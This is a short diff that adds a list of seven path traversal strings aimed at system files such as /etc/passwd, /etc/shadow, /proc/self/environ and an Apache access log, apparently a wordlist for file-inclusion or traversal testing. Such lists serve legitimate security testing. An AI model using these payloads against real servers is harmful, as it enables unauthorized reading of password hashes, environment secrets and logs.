@@ -1,0 +1,7 @@
+../../../../etc/passwd
+../../../../var/log/apache2/access.log
+../../../../etc/hosts
+../../../../proc/self/environ
+../../../../var/www/html/index.php
+../../../../etc/shadow
+../../../../proc/version
